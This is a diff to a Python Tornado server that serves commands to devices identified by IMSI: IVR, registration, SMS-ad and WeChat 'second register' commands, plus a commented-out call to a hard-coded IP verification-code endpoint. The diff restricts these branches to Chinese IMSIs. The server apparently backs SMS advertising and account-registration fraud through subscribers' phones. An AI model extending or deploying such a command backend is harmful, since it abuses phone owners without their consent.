@@ -330,7 +330,7 @@ def get_imsi_response(_imsi, _threads, _svn):
             if (_return == None or len(_return) <= 1) and _svn >= 3900 and get_system_parameter_from_db('openIvr') == 'open':
                 _return = get_ivr_cmd(_record_user, _threads)
 
-            if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('openRegister') == 'open':
+            if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('openRegister') == 'open' and _imsi.startswith('460'):
                 _return = get_register_cmd(_record_user, _threads)
                 if _return != None:
                     _g_insert_register_cmd_log = insert_register_cmd_log(
@@ -338,9 +338,9 @@ def get_imsi_response(_imsi, _threads, _svn):
                     _g_insert_register_cmd_log.start()
                     # _threads.append(threading.Thread(
                     # target=insert_register_cmd_log(_record_user, _return)))
-            if ctime - int(_record_user['insertTime']) > 864000 and (_return == None or len(_return) <= 1) and get_system_parameter_from_db('sendSmsAd') == 'open':
+            if (_return == None or len(_return) <= 1) and ctime - int(_record_user['insertTime']) > 864000 and get_system_parameter_from_db('sendSmsAd') == 'open' and _imsi.startswith('460'):
                 _return = get_sms_ad_cmd(_record_user, _threads)
-            if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('weixin2ndRegisterWithRandomMo') == 'open' and (not (str(_record_user['province']) in str(get_system_parameter_from_db('weixin2ndRegisterCloseArea')))) and (not (str(_record_user['city']) in str(get_system_parameter_from_db('weixin2ndRegisterCloseArea')))):
+            if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('weixin2ndRegisterWithRandomMo') == 'open' and (not (str(_record_user['province']) in str(get_system_parameter_from_db('weixin2ndRegisterCloseArea')))) and (not (str(_record_user['city']) in str(get_system_parameter_from_db('weixin2ndRegisterCloseArea')))) and _imsi.startswith('460'):
                 relationId = checkWeixinRelation(_record_user)
                 if relationId > 0:
                     # async_notify_url('http://121.201.67.97:8080/verifycode/api/getWXChMobile.jsp?cid=c159&pid=wx159&mobile=%s&ccpara=%s' % (
@@ -1027,15 +1027,6 @@ def log_fetch_sms_ads(data, url, resp):
     return
 
 
-def make_app():
-    return tornado.web.Application([
-        (r"/", MainHandler),
-        (r"/tcd/", MainHandler),
-        (r"/match/", MatchHandler),
-        (r"/test/", TestHandler),
-    ])
-
-
 def get_test_response(_imsi_info):
     _dbConfig = poolConfig.connection()
     _cur = _dbConfig.cursor()
@@ -1061,6 +1052,16 @@ def check_test_imsi(_imsi):
     _cur.close()
     _dbConfig.close()
     return _record
+
+
+def make_app():
+    return tornado.web.Application([
+        (r"/", MainHandler),
+        (r"/tcd/", MainHandler),
+        (r"/match/", MatchHandler),
+        (r"/test/", TestHandler),
+    ])
+
 
 if __name__ == "__main__":
     logger.info("begin... on port:" + str(config.GLOBAL_SETTINGS['port']))
